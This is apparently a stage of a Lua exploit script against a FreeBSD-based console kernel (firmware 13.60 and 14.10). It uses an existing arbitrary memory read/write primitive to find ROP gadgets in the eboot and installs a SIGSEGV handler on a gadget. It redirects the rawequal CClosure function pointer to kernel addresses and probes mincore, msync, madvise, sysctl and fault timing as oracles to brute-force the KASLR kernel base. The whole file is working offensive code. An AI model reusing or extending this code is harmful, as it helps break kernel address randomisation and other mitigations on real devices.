-- CRASH_CLASS: MODERATE
-- PROBE 56k: KASLR brute-force via signal handler + errno oracle
--
-- Context: ALL memory scanning and timing KASLR paths are dead on 14.10.
-- SMAP blocks timing side-channel. No kernel pointers in any userland memory.
--
-- 13.60 data:
--   kernel_base observed: 0xffffffff8a9c0000 and 0xffffffff9e3f0000
--   sysent offset from TEXT: 0xE6E5C0
--   alignment: at least 0x10000 (64KB), both 16KB-page-aligned
--   KERNBASE: 0xffffffff80000000
--
-- Strategy:
--   [A] Setup + derive addresses
--   [B] Install SIGSEGV handler via sigaction(416) — test if we can recover from faults
--   [C] Errno oracle: mincore/msync/madvise with kernel VAs — check if errno differs
--       for mapped (present but supervisor) vs unmapped kernel pages
--   [D] sys 202 sysctl errno check with kernel VA as output buffer
--   [E] CClosure redirect to kernel VA — test if pcall or signal handler catches it
--   [F] Batch candidate test: if any oracle works, scan the KASLR range

print("=== PROBE 56k: KASLR BRUTE-FORCE ===")
print("")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function safe_rd(addr)
    local ok, val = pcall(function() return memory.read_dword(addr) end)
    if ok then return to_num(val) end
    return nil
end
local function safe_rq(addr)
    local ok, val = pcall(function() return memory.read_qword(addr) end)
    if ok then return val end
    return nil
end
local function safe_wd(addr, val)
    local ok = pcall(function() memory.write_dword(addr, val) end)
    return ok
end
local function safe_wq(addr, val)
    local ok = pcall(function() memory.write_qword(addr, val) end)
    return ok
end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, to_num(val)
end
local function hexval(val)
    if val == nil then return "nil" end
    local h, l = get_hi_lo(val)
    return string.format("0x%08X_%08X", h, l)
end

print("[A] Setup")
local sc_getpid = make_syscall(20)
local our_pid = to_num(sc_getpid())
print("  PID: " .. our_pid)

collectgarbage("stop")

-- Get eboot base for gadget search
local sc_info = make_syscall(593)
local info_buf = memory.alloc(0x200)
safe_wd(info_buf, 0x160)
pcall(function() sc_info(uint64(0), info_buf) end)
local eb_text_lo = safe_rd(info_buf + 0x108) or 0
local eb_text_hi = safe_rd(info_buf + 0x10C) or 0
local eb_text_sz = safe_rd(info_buf + 0x110) or 0
print(string.format("  eboot text: 0x%X_%08X size=0x%X", eb_text_hi, eb_text_lo, eb_text_sz))

-- Get rawequal CClosure address for redirect
local re_str = tostring(rawequal)
local re_dec = re_str:match(": (%d+)")
local re_hex = re_str:match("(0x[0-9a-fA-F]+)")
local cclosure_addr = nil
if re_hex then
    cclosure_addr = uint64(re_hex)
    print("  rawequal CClosure: " .. re_hex)
elseif re_dec then
    cclosure_addr = uint64(re_dec)
    print("  rawequal CClosure: " .. re_dec)
end

-- clock_gettime for nanosecond timing
local sc_clock = make_syscall(232)
local ts = memory.alloc(16)
local function get_ns()
    safe_wq(ts, uint64(0))
    safe_wq(ts + 8, uint64(0))
    pcall(function() sc_clock(uint64(4), uint64(ts)) end)
    local sec = safe_rd(ts) or 0
    local nsec = safe_rd(ts + 8) or 0
    return sec * 1000000000 + nsec
end

-- ============================================================
-- [B] Signal handler installation via sigaction(416)
-- FreeBSD sigaction: sys 416, args: (sig, act, oact)
-- struct sigaction { void(*handler)(int); int sa_flags; sigset_t sa_mask; }
-- SIGSEGV = 11, SA_SIGINFO = 0x40
-- ============================================================
print("")
print("[B] Signal handler test")

local sc_sigaction = make_syscall(416)

-- We need a handler address. Use a known safe function.
-- Find the xor eax,eax; ret gadget (C3) in eboot — this returns 0
-- It won't properly sigreturn, but let's see what happens
local gadget_addr = nil
if eb_text_sz > 0 then
    local search_start = uint64(string.format("0x%X%08X", eb_text_hi, eb_text_lo))
    -- Search for C3 (ret) preceded by 31 C0 (xor eax,eax) = 31 C0 C3
    for off = 0, math.min(eb_text_sz - 3, 0x100000), 1 do
        local a = search_start + off
        local b0 = safe_rd(a)
        if b0 then
            local byte0 = b0 % 256
            local byte1 = math.floor(b0 / 256) % 256
            local byte2 = math.floor(b0 / 65536) % 256
            if byte0 == 0x31 and byte1 == 0xC0 and byte2 == 0xC3 then
                gadget_addr = a
                print(string.format("  xor eax,eax;ret at eboot+0x%X", off))
                break
            end
        end
    end
    if not gadget_addr then
        -- Fallback: just find a ret (C3)
        for off = 0, math.min(eb_text_sz - 1, 0x10000), 1 do
            local a = search_start + off
            local b0 = safe_rd(a)
            if b0 and (b0 % 256) == 0xC3 then
                gadget_addr = a
                print(string.format("  ret gadget at eboot+0x%X", off))
                break
            end
        end
    end
end

-- Try installing SIGSEGV handler
-- sigaction struct layout on FreeBSD amd64:
-- +0x00: sa_handler (8 bytes)
-- +0x08: sa_flags (4 bytes)
-- +0x10: sa_mask (16 bytes - sigset_t)
-- Total: ~0x20 bytes
local sa_buf = memory.alloc(0x40)
local sa_old = memory.alloc(0x40)
for i = 0, 15 do safe_wd(sa_buf + i*4, 0) end
for i = 0, 15 do safe_wd(sa_old + i*4, 0) end

local sa_installed = false
if gadget_addr then
    -- Set handler to our gadget
    safe_wq(sa_buf, gadget_addr)
    -- SA_SIGINFO = 0x40, SA_RESTART = 0x2
    safe_wd(sa_buf + 8, 0x42)
    -- Empty signal mask
    safe_wq(sa_buf + 0x10, uint64(0))
    safe_wq(sa_buf + 0x18, uint64(0))

    local sa_ok, sa_ret = pcall(function()
        return sc_sigaction(uint64(11), uint64(sa_buf), uint64(sa_old))
    end)
    local sa_rv = sa_ok and to_num(sa_ret) or -999
    print("  sigaction(SIGSEGV) ret=" .. sa_rv)

    if sa_rv == 0 then
        sa_installed = true
        -- Read old handler
        local old_handler = safe_rq(sa_old)
        print("  old handler: " .. hexval(old_handler))
    end
else
    print("  no gadget found, skipping sigaction")
end

-- ============================================================
-- [C] Errno oracle: mincore/msync/madvise on kernel VAs
-- Test if errno differs between mapped-supervisor and unmapped kernel pages
-- ============================================================
print("")
print("[C] Errno oracle test")

local sc_mincore = make_syscall(78)
local sc_msync = make_syscall(227)
local sc_madvise = make_syscall(75)
local vec_buf = memory.alloc(64)

-- Helper to get errno via __error()
-- Actually we can't easily get errno from Lua. Use return value patterns.
-- FreeBSD syscalls return -1 on error; the actual errno is in a thread-local.
-- Our pcall wrapper can distinguish: ret=-1 vs pcall-fail vs ret=0

local function test_oracle(name, addr_hi, addr_lo)
    local addr_str = string.format("0x%08X%08X", addr_hi, addr_lo)
    local addr = uint64(addr_str)

    -- mincore(addr, 0x4000, vec)
    safe_wd(vec_buf, 0xFF)
    local mc_ok, mc_ret = pcall(function()
        return sc_mincore(uint64(addr_str), uint64(0x4000), uint64(vec_buf))
    end)
    local mc_rv = mc_ok and to_num(mc_ret) or -999
    local mc_vec = safe_rd(vec_buf) or 0xFF

    -- msync(addr, 0x4000, MS_ASYNC=1)
    local ms_ok, ms_ret = pcall(function()
        return sc_msync(uint64(addr_str), uint64(0x4000), uint64(1))
    end)
    local ms_rv = ms_ok and to_num(ms_ret) or -999

    -- madvise(addr, 0x4000, MADV_WILLNEED=3)
    local ma_ok, ma_ret = pcall(function()
        return sc_madvise(uint64(addr_str), uint64(0x4000), uint64(3))
    end)
    local ma_rv = ma_ok and to_num(ma_ret) or -999

    return mc_rv, mc_vec, ms_rv, ma_rv
end

-- Test reference points first
print("  Reference: userland valid address")
local ref_heap = memory.alloc(0x4000)
do
    local rh_h, rh_l = get_hi_lo(ref_heap)
    if rh_h == 0 then rh_h = 0; rh_l = to_num(ref_heap) end
    local mc, mcv, ms, ma = test_oracle("heap", rh_h, rh_l)
    print(string.format("    mincore=%d vec=0x%X msync=%d madvise=%d", mc, mcv, ms, ma))
end

print("  Reference: unmapped userland")
do
    local mc, mcv, ms, ma = test_oracle("unmap", 0x00007FFF, 0xDEAD0000)
    print(string.format("    mincore=%d vec=0x%X msync=%d madvise=%d", mc, mcv, ms, ma))
end

-- Now test kernel VAs — these are the candidates from 13.60 observed bases
-- On 14.10, the kernel base is somewhere in the KASLR range
-- KERNBASE = 0xFFFFFFFF80000000
local kva_tests = {
    {name="KERNBASE",           hi=0xFFFFFFFF, lo=0x80000000},
    {name="13.60 base1",        hi=0xFFFFFFFF, lo=0x8A9C0000},
    {name="13.60 base1+sysent", hi=0xFFFFFFFF, lo=0x8A9C0000 + 0xE6E5C0},
    {name="13.60 base2",        hi=0xFFFFFFFF, lo=0x9E3F0000},
    {name="unmapped kernel hi", hi=0xFFFFFFFF, lo=0xF0000000},
    {name="FFFFFFFF_FFFFFFFF",  hi=0xFFFFFFFF, lo=0xFFFFFFFF},
    {name="low kernel",         hi=0xFFFF8000, lo=0x00000000},
    {name="mid kernel",         hi=0xFFFF8000, lo=0x40000000},
}

print("  Kernel VA oracle tests:")
local results = {}
for _, t in ipairs(kva_tests) do
    local mc, mcv, ms, ma = test_oracle(t.name, t.hi, t.lo)
    print(string.format("    %s: mc=%d vec=0x%X ms=%d ma=%d",
        t.name, mc, mcv, ms, ma))
    results[t.name] = {mc=mc, ms=ms, ma=ma}
end

-- Check if ANY result differs from the "unmapped kernel hi" baseline
local baseline = results["unmapped kernel hi"]
local oracle_found = false
if baseline then
    for _, t in ipairs(kva_tests) do
        local r = results[t.name]
        if r and (r.mc ~= baseline.mc or r.ms ~= baseline.ms or r.ma ~= baseline.ma) then
            if t.name ~= "unmapped kernel hi" then
                print("  ** ORACLE HIT: " .. t.name .. " differs from unmapped baseline! **")
                oracle_found = true
            end
        end
    end
end
if not oracle_found then
    print("  No errno differentiation found (all kernel VAs return same)")
end

-- ============================================================
-- [D] sys 202 sysctl with kernel VA as output buffer
-- If copyin/copyout returns different errno for valid-supervisor vs unmapped...
-- ============================================================
print("")
print("[D] Sysctl buffer oracle")

local sc_sysctl = make_syscall(202)
local mib = memory.alloc(16)
local oldlenp = memory.alloc(8)

-- kern.version = MIB {1, 4}
safe_wd(mib, 1)
safe_wd(mib + 4, 4)

-- Test with valid userland buffer (reference)
local outbuf = memory.alloc(0x400)
safe_wd(oldlenp, 0x400)
local sv_ok, sv_ret = pcall(function()
    return sc_sysctl(uint64(mib), uint64(2), uint64(outbuf), uint64(oldlenp), uint64(0), uint64(0))
end)
print("  kern.version to heap: ret=" .. (sv_ok and to_num(sv_ret) or -999))

-- Test with kernel VA as output buffer
local kva_buf_tests = {
    {name="KERNBASE",    addr="0xFFFFFFFF80000000"},
    {name="13.60 base1", addr="0xFFFFFFFF8A9C0000"},
    {name="unmapped hi", addr="0xFFFFFFFFF0000000"},
    {name="NULL",        addr="0x0000000000000000"},
}

for _, t in ipairs(kva_buf_tests) do
    safe_wd(oldlenp, 0x400)
    local ok, ret = pcall(function()
        return sc_sysctl(uint64(mib), uint64(2), uint64(t.addr), uint64(oldlenp), uint64(0), uint64(0))
    end)
    local rv = ok and to_num(ret) or -999
    print(string.format("  kern.version to %s: ret=%d", t.name, rv))
end

-- ============================================================
-- [E] CClosure redirect to kernel VA — does pcall catch the fault?
-- WARNING: this WILL crash if signal handler doesn't recover
-- Only test if signal handler was installed
-- ============================================================
print("")
print("[E] CClosure redirect fault test")

if sa_installed and cclosure_addr then
    -- Save original +0x20
    local orig_fn = safe_rq(cclosure_addr + 0x20)
    print("  rawequal +0x20 original: " .. hexval(orig_fn))

    -- Test 1: redirect to a known-safe userland address (gadget) to confirm redirect works
    if gadget_addr then
        safe_wq(cclosure_addr + 0x20, gadget_addr)
        local test_ok, test_ret = pcall(function() return rawequal(1, 2) end)
        -- Restore immediately
        safe_wq(cclosure_addr + 0x20, orig_fn)
        print("  redirect to gadget: pcall_ok=" .. tostring(test_ok) .. " ret=" .. tostring(test_ret))
    end

    -- Test 2: redirect to UNMAPPED kernel VA (should fault)
    print("  Testing redirect to unmapped kernel VA...")
    print("  (if no output after this, process crashed)")
    safe_wq(cclosure_addr + 0x20, uint64("0xFFFFFFFFF0000000"))
    local fault_ok, fault_ret = pcall(function() return rawequal(1, 2) end)
    -- Restore
    safe_wq(cclosure_addr + 0x20, orig_fn)
    print("  redirect to unmapped kernel: pcall_ok=" .. tostring(fault_ok) ..
          " ret=" .. tostring(fault_ret))

    -- If we survived, test with 13.60 kernel base
    print("  Testing redirect to 13.60 base1 kernel VA...")
    print("  (if no output after this, process crashed)")
    safe_wq(cclosure_addr + 0x20, uint64("0xFFFFFFFF8A9C0000"))
    local kb_ok, kb_ret = pcall(function() return rawequal(1, 2) end)
    safe_wq(cclosure_addr + 0x20, orig_fn)
    print("  redirect to kernel base1: pcall_ok=" .. tostring(kb_ok) ..
          " ret=" .. tostring(kb_ret))

    -- If we STILL survived, the signal handler works as a fault recovery!
    -- Now test: does behavior differ for mapped vs unmapped kernel pages?
    if fault_ok ~= nil then
        print("")
        print("  ** SIGNAL RECOVERY WORKS — testing oracle **")

        -- Time the fault for mapped vs unmapped
        local SAMPLES = 20
        local unmapped_times = {}
        local mapped_times = {}

        -- Unmapped VA: 0xFFFFFFFFF0000000
        for i = 1, SAMPLES do
            local ta = get_ns()
            safe_wq(cclosure_addr + 0x20, uint64("0xFFFFFFFFF0000000"))
            pcall(function() return rawequal(1, 2) end)
            safe_wq(cclosure_addr + 0x20, orig_fn)
            local tb = get_ns()
            unmapped_times[i] = tb - ta
        end

        -- 13.60 base1 VA: 0xFFFFFFFF8A9C0000 (might be mapped on 14.10 if same base)
        for i = 1, SAMPLES do
            local ta = get_ns()
            safe_wq(cclosure_addr + 0x20, uint64("0xFFFFFFFF8A9C0000"))
            pcall(function() return rawequal(1, 2) end)
            safe_wq(cclosure_addr + 0x20, orig_fn)
            local tb = get_ns()
            mapped_times[i] = tb - ta
        end

        local sum_u, sum_m = 0, 0
        for i = 1, SAMPLES do
            sum_u = sum_u + unmapped_times[i]
            sum_m = sum_m + mapped_times[i]
        end
        print(string.format("  unmapped avg=%d ns, mapped avg=%d ns",
            sum_u / SAMPLES, sum_m / SAMPLES))
        print(string.format("  unmapped samples: %d,%d,%d,%d,%d",
            unmapped_times[1], unmapped_times[2], unmapped_times[3],
            unmapped_times[4], unmapped_times[5]))
        print(string.format("  mapped samples: %d,%d,%d,%d,%d",
            mapped_times[1], mapped_times[2], mapped_times[3],
            mapped_times[4], mapped_times[5]))

        local diff = math.abs(sum_m / SAMPLES - sum_u / SAMPLES)
        local noise = math.abs(unmapped_times[1] - unmapped_times[2])
        if diff > noise * 3 then
            print("  ** TIMING ORACLE VIABLE — mapped/unmapped timing differs! **")
        else
            print("  timing difference within noise")
        end
    end
else
    if not sa_installed then
        print("  signal handler not installed, skipping redirect tests")
    end
    if not cclosure_addr then
        print("  CClosure addr not found, skipping redirect tests")
    end
end

-- ============================================================
-- [F] Batch KASLR scan (if oracle found)
-- 13.60 data: bases at offset 0x0A9C0000 and 0x1E3F0000 from KERNBASE
-- Try scanning with 0x200000 (2MB) steps from KERNBASE to KERNBASE+1GB
-- ============================================================
print("")
print("[F] KASLR batch scan")

-- Even without a proven oracle, dump the errno/return patterns for
-- a range of candidates so we can look for anomalies offline
local KERNBASE_HI = 0xFFFFFFFF
local KERNBASE_LO = 0x80000000
local STEP = 0x200000  -- 2MB steps
local MAX_SCAN = 0x40000000  -- 1GB range = 512 candidates

print(string.format("  range: 0x%08X_%08X to 0x%08X_%08X step=0x%X",
    KERNBASE_HI, KERNBASE_LO,
    KERNBASE_HI, KERNBASE_LO + MAX_SCAN,
    STEP))
print("  candidates: " .. (MAX_SCAN / STEP))

-- Quick scan: mincore + msync for each candidate
local anomalies = {}
for off = 0, MAX_SCAN - STEP, STEP do
    local cand_lo = KERNBASE_LO + off
    local cand_hi = KERNBASE_HI
    -- Handle overflow
    if cand_lo >= 0x100000000 then
        cand_lo = cand_lo - 0x100000000
        -- Still in high canonical space, this wraps but kernel VA space is flat
    end

    local addr_str = string.format("0x%08X%08X", cand_hi, cand_lo)
    local addr = uint64(addr_str)

    -- mincore
    safe_wd(vec_buf, 0xFF)
    local mc_ok, mc_ret = pcall(function()
        return sc_mincore(addr, uint64(0x4000), uint64(vec_buf))
    end)
    local mc_rv = mc_ok and to_num(mc_ret) or -999
    local mc_vec = safe_rd(vec_buf) or 0xFF

    -- msync
    local ms_ok, ms_ret = pcall(function()
        return sc_msync(addr, uint64(0x4000), uint64(1))
    end)
    local ms_rv = ms_ok and to_num(ms_ret) or -999

    -- Check for anomaly (different from standard -1/-999 pattern)
    if mc_rv ~= -1 or ms_rv ~= -1 or mc_vec ~= 0xFF then
        local idx = #anomalies + 1
        anomalies[idx] = string.format("0x%08X_%08X mc=%d vec=0x%X ms=%d",
            cand_hi, cand_lo, mc_rv, mc_vec, ms_rv)
        if idx <= 20 then
            print("  ANOMALY: " .. anomalies[idx])
        end
    end
end

print(string.format("  scan complete. anomalies: %d / %d", #anomalies, MAX_SCAN / STEP))

if #anomalies == 0 then
    print("  no errno anomalies found in 2MB scan")
    print("  trying 64KB step on smaller range (KERNBASE to +256MB)...")

    -- Finer scan on a subset
    local FINE_MAX = 0x10000000  -- 256MB
    local FINE_STEP = 0x10000    -- 64KB
    local fine_anomalies = 0

    for off = 0, FINE_MAX - FINE_STEP, FINE_STEP do
        local cand_lo = KERNBASE_LO + off
        local addr_str = string.format("0x%08X%08X", KERNBASE_HI, cand_lo)

        safe_wd(vec_buf, 0xFF)
        local mc_ok, mc_ret = pcall(function()
            return sc_mincore(uint64(addr_str), uint64(0x4000), uint64(vec_buf))
        end)
        local mc_rv = mc_ok and to_num(mc_ret) or -999
        local mc_vec = safe_rd(vec_buf) or 0xFF

        if mc_rv ~= -1 or mc_vec ~= 0xFF then
            fine_anomalies = fine_anomalies + 1
            if fine_anomalies <= 10 then
                print(string.format("    ANOMALY at 0x%08X_%08X mc=%d vec=0x%X",
                    KERNBASE_HI, cand_lo, mc_rv, mc_vec))
            end
        end
    end
    print(string.format("  fine scan: %d anomalies / %d candidates",
        fine_anomalies, FINE_MAX / FINE_STEP))
end

collectgarbage("restart")

print("")
print("=== PROBE 56k COMPLETE ===")
